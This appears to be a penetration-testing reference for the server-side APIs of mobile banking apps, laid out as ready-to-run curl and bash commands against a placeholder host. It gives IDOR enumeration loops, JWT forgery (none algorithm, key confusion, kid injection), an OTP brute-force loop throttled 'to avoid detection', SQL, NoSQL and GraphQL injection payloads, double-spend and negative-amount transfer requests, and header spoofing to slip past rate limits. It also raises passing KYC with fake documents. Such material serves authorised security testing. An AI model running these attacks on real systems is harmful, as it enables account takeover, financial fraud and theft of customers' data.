# API Testing Reference (Server-side)

## BOLA / IDOR Testing

### Methodology

```bash
# 1. Identify endpoints with resource identifiers
# GET /api/v1/users/{user_id}/profile
# GET /api/v1/accounts/{account_id}/balance
# GET /api/v1/transactions/{txn_id}
# POST /api/v1/transfers/{transfer_id}/status

# 2. Capture legitimate request with User A's token
# 3. Replace resource ID with User B's resource
# 4. Check if data is returned (horizontal privilege escalation)

# 5. Test vertical escalation:
# - Regular user accessing admin endpoints
# - Free tier accessing premium features
# - User accessing internal/debug endpoints
```

### Common IDOR Patterns in Mobile Banking

```bash
# Account balance/details
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/accounts/ACC-B-12345/balance"

# Transaction history (other user's transactions)
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/users/USER_B_ID/transactions"

# Profile information
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/users/USER_B_ID/profile"

# Document/statement download
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/statements/STMT-B-001/download"

# Beneficiary details
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.target.com/v1/beneficiaries/BEN-B-001"
```

### ID Enumeration Techniques

```bash
# Sequential numeric IDs
for id in $(seq 1000 1100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$id/profile")
  echo "$id: $STATUS"
done

# UUID v1 (time-based, partially predictable)
# Extract timestamp from UUID: first 8 chars = low 32 bits of timestamp
# If you know approximate creation time, you can narrow the search

# Encoded IDs (Base64, hex)
echo -n "user_12345" | base64  # dXNlcl8xMjM0NQ==
# Try: echo -n "user_12346" | base64

# Hash-based IDs (MD5/SHA of predictable input)
echo -n "user@email.com" | md5
# If ID = hash(email), and you know emails, you can generate IDs
```

---

## Authentication Bypass

### JWT Attacks

```bash
# 1. Decode JWT (no verification needed)
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 2. None algorithm attack
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature (third part)
# Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = '<original_payload_base64>'
print(f'{header.decode()}.{payload}.')
"

# 3. Algorithm confusion (RS256 → HS256)
# If server uses RS256, try signing with HS256 using the PUBLIC key as secret
# Tool: jwt_tool
pip install jwt-tool
python3 jwt_tool.py "$JWT" -X k -pk public_key.pem

# 4. Modify claims
python3 jwt_tool.py "$JWT" -T  # tamper mode
# Change: sub, role, scope, exp, admin, etc.

# 5. Key ID (kid) injection
# {"alg":"HS256","kid":"../../etc/passwd"}
# Server may use kid to load signing key from file

# 6. JWK header injection
# Embed attacker's public key in JWT header
python3 jwt_tool.py "$JWT" -X i
```

### OTP Bypass Techniques

```bash
# 1. Brute force (if no rate limiting)
# 6-digit OTP = 1,000,000 combinations
# At 100 req/s = ~3 hours (often feasible)
for otp in $(seq -w 000000 999999); do
  curl -s -X POST "https://api.target.com/v1/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -d "{\"request_id\":\"$REQ_ID\",\"otp\":\"$otp\"}" &
  # Throttle to avoid detection
  [ $((otp % 10)) -eq 0 ] && wait
done

# 2. OTP reuse (use same OTP twice)
# Verify OTP → success → try same OTP again

# 3. OTP in response (check if OTP leaks in response headers/body)
curl -v -X POST "https://api.target.com/v1/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+62xxx"}'
# Check response body AND headers for OTP value

# 4. Default/test OTP
# Try: 000000, 111111, 123456, 654321, 999999

# 5. Manipulate phone number format
# +62812xxx vs 0812xxx vs 812xxx — do they share OTP state?

# 6. Race condition (request multiple OTPs, use any)
# Request OTP 5 times rapidly — are all valid?

# 7. OTP length manipulation
# Send 4-digit, 5-digit, 7-digit — does validation break?
```

### Session/Token Attacks

```bash
# 1. Token not invalidated on logout
# Login → get token → logout → use old token
curl -H "Authorization: Bearer $OLD_TOKEN" "https://api.target.com/v1/user/profile"

# 2. Token not invalidated on password change
# Same as above but after password/PIN change

# 3. Concurrent sessions
# Login on device A → login on device B → does device A's token still work?

# 4. Refresh token rotation
# Use refresh token → get new access token → use OLD refresh token again
# If old refresh token still works → no rotation (vulnerability)

# 5. Token in URL (leaks via referrer, logs)
# Check if any endpoint accepts token as query parameter
curl "https://api.target.com/v1/user/profile?token=$JWT"
```

---

## Injection Testing

### SQL Injection

```bash
# Common injection points in mobile APIs:
# - Search/filter parameters
# - Sort/order parameters
# - ID fields (less common with ORMs)

# Test payloads
PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "1; SELECT SLEEP(5)--"
    "1 UNION SELECT null,null,null--"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -X GET "https://api.target.com/v1/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \
    -H "Authorization: Bearer $TOKEN"
done

# Time-based blind
curl -s -w "\nTime: %{time_total}\n" \
  "https://api.target.com/v1/users/1' AND SLEEP(5)--/profile" \
  -H "Authorization: Bearer $TOKEN"
```

### NoSQL Injection (MongoDB)

```bash
# Operator injection
curl -X POST "https://api.target.com/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# $regex for enumeration
curl -X POST "https://api.target.com/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^admin"},"password":{"$gt":""}}'

# $where injection
curl -X POST "https://api.target.com/v1/search" \
  -H "Content-Type: application/json" \
  -d '{"filter":{"$where":"sleep(5000)"}}'
```

### GraphQL Attacks

```bash
# Introspection (discover schema)
curl -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Batch queries (bypass rate limiting)
curl -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# Nested query DoS (if no depth limiting)
curl -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:1) { friends { friends { friends { friends { name } } } } } }"}'

# Mutation without auth
curl -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id:1, role:\"admin\") { id role } }"}'
```

---

## Business Logic Testing

### Financial Transaction Attacks

```bash
# 1. Negative amount
curl -X POST "https://api.target.com/v1/transfer" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from":"MY_ACC","to":"OTHER_ACC","amount":-1000}'

# 2. Zero amount
-d '{"from":"MY_ACC","to":"OTHER_ACC","amount":0}'

# 3. Decimal manipulation
-d '{"from":"MY_ACC","to":"OTHER_ACC","amount":0.001}'  # below minimum
-d '{"from":"MY_ACC","to":"OTHER_ACC","amount":999999999999}'  # overflow

# 4. Currency confusion
-d '{"from":"MY_ACC","to":"OTHER_ACC","amount":100,"currency":"USD"}'  # if app is IDR

# 5. Self-transfer exploitation
-d '{"from":"MY_ACC","to":"MY_ACC","amount":1000}'  # any bonus/cashback triggered?

# 6. Race condition (double-spend)
# Send same transfer request simultaneously
for i in $(seq 1 10); do
  curl -X POST "https://api.target.com/v1/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"from":"MY_ACC","to":"OTHER_ACC","amount":100,"idempotency_key":"unique_'$i'"}' &
done
wait
# Check: did balance decrease by 100 or 1000?

# 7. Step skipping in multi-step flow
# Normal: initiate → confirm → execute
# Skip: directly call execute endpoint without confirm
```

### Promo/Referral Abuse

```bash
# 1. Self-referral
# Use own referral code on new account

# 2. Referral code brute-force
# If codes are short/predictable, enumerate valid ones

# 3. Promo code reuse
# Apply same promo code multiple times
# Apply on multiple accounts

# 4. Coupon value manipulation
# If coupon details sent client-side, modify discount amount
```

### Account Takeover Vectors

```bash
# 1. Phone number recycling
# Old user's phone number reassigned → can new owner access old account?

# 2. Email change without verification
# Change email → password reset to new email

# 3. Weak KYC verification
# Can we pass KYC with fake documents?
# Is KYC status a client-side flag?

# 4. Support/admin endpoint access
# /api/v1/admin/users/{id}/reset-password
# /api/v1/support/impersonate/{user_id}
```

---

## Rate Limiting & Brute Force

### Testing Methodology

```bash
# Identify rate limit mechanism:
# - Per IP? (bypass with X-Forwarded-For)
# - Per account? (bypass with different accounts)
# - Per device? (bypass with different device IDs)
# - Global? (harder to bypass)

# Header bypass attempts:
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "X-Forwarded-Host: localhost"
)

for header in "${HEADERS[@]}"; do
  curl -s -o /dev/null -w "%{http_code}" \
    -H "$header" \
    -X POST "https://api.target.com/v1/auth/verify-otp" \
    -d '{"otp":"000000"}'
done

# Distributed brute force (rotate IPs)
# Use X-Forwarded-For with incrementing IPs:
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" \
    -X POST "https://api.target.com/v1/auth/verify-otp" \
    -d "{\"otp\":\"$(printf '%06d' $i)\"}"
done
```

---

## Data Exposure

### Response Analysis

```bash
# Check for excessive data in responses
# Compare: what does the UI show vs what the API returns?
# If API returns full SSN but UI shows ***-**-1234 → over-exposure

# Common over-exposures in banking apps:
# - Full card number (should be last 4 only)
# - Full phone numbers of transfer recipients
# - Internal user IDs / database primary keys
# - Account creation timestamps (user enumeration)
# - Exact balance of other users (in shared accounts)
# - Transaction details of other parties

# Debug/internal endpoints
PATHS=(
    "/debug" "/actuator" "/health" "/info" "/env"
    "/swagger" "/api-docs" "/graphql/playground"
    "/admin" "/internal" "/_debug" "/trace"
    "/api/v1/debug/user" "/api/v1/internal/config"
)

for path in "${PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done
```

### Error Message Analysis

```bash
# Trigger errors intentionally:
# - Invalid JSON body
# - Missing required fields
# - Wrong data types (string where int expected)
# - Extremely long values
# - Special characters

# Look for in error responses:
# - Stack traces (technology disclosure)
# - SQL error messages (injection confirmation)
# - Internal file paths
# - Internal IP addresses
# - Framework/library versions
# - Database table/column names
```

---

## Cross-Reference with ptest

For comprehensive server-side API testing beyond mobile-specific concerns, load these ptest references:

- `enumeration.md` — service fingerprinting, tech stack identification
- `attack-surface.md` — cross-environment correlation
- `web-vuln-bypass-tables.md` — WAF bypass techniques
- `advanced-web-attacks.md` — race conditions, HTTP smuggling, SSRF

The mobile API testing in this phase focuses on **mobile-specific** server-side issues:
- Token lifecycle and session management
- OTP/biometric server validation
- Device binding and multi-device policies
- Push notification token security
- Mobile-specific business logic (transfers, payments)
